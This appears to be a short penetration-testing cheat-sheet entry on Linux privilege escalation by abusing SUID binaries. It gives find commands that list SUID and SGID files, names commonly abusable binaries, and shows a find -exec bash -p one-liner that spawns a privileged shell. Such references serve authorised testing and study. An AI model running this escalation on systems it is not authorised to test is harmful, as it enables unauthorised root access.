---
title: SUID Binary Abuse
category: privesc
subcategory: linux-privesc
os: linux
command: find / -perm -u=s -type f 2>/dev/null
tools: find, gtfobins
---


### Find SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm /4000
```

### Find SGID binaries

```bash
find / -perm -g=s -type f 2>/dev/null
```

### Common SUID-abusable binaries

`nmap`, `vim`, `find`, `bash`, `more`, `less`, `nano`, `cp`.

### find example escalation

```bash
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```

### Reference

https://gtfobins.github.io/
